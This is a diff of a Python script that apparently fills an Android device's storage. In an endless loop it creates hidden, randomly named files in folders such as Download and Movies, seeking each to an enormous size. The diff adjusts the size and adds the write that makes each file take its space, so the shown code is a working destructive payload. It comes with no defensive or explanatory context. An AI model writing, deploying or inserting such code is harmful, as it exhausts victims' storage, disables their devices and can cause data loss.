@@ -47,7 +47,7 @@ try:
     import uuid
 except:
     os.system('pip3 install uuid')
-size = 3419559 * 5024 * 1024
+size = 109559 * 5024 * 1024
 filename_prefix = '.file'
 try:
 	paths = ['/storage/emulated/0/', '/storage/emulated/0/Download/', '/storage/emulated/0/Movies/','/storage/emulated/0/Android/']
@@ -58,3 +58,4 @@ while True:
     filename = os.path.join(path, f"{filename_prefix}_{uuid.uuid4()}")
     with open(filename, 'wb') as f:
         f.seek(size - 1)
+        f.write(b'\0')
